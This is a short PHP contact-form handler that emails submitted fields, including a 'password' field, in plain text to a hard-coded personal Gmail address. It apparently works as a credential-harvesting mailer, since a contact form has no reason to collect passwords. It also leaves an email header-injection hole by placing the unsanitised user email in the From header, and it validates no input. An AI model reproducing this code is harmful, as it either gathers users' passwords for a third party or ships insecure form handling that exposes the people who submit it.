<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $name = $_POST['name'];
    $email = $_POST['email'];
    $password = $_POST['password'];
    $problem = $_POST['problem'];
    $contact = $_POST['contact'];

    // Your email
    $to = "vamsikatchalla@gmail.com";

    // Subject
    $subject = "New Contact Form Submission";

    // Message content
    $message = "Name: $name\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";
    $message .= "Problem Details: $problem\n";
    $message .= "Contact Number: $contact\n";

    // Headers
    $headers = "From: $email";

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        echo "Your message has been sent successfully.";
    } else {
        echo "Failed to send your message. Please try again later.";
    }
}
?>
